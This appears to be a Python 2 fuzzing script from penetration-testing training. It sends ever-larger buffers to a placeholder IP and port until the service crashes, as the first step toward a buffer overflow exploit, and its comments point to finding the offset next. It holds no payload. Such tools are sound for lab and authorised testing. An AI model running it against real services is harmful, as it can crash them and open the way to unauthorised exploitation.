#!/usr/bin/python
#PROGRAM FOR FUZZING BUFFER OVERFLOWS
#YOU SHOULD HAVE IDENTIFIED A VULNERABLE PARAMETER BY NOW USING generic_send_tcp AND A SPIKE SCRIPT (spk)
import sys, socket
from time import sleep

#Setting buffer...Just a bunch of junk
buffer = 'A' * 100

#Now to loop through and see where it breaks
while True:
    try:
        #Establishing socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        #Connecting and sending your data
        #CHANGE HERE
        s.connect(('IP',PORT))
        s.send(buffer + "\r\n")
        s.recv(1024)
        s.close()
        #Give it a second, and do it again
        sleep(1)
        #Increment the buffer, and push it out again
        buffer = buffer + ('a' * 100)
    except:
        #When the program crashes, you'll have a vague idea of how much data you need to break stuff.
        print("Your buffer crashed the program at %s bytes") % str(len(buffer))
        sys.exit()
        #Round UP, and then find the offset.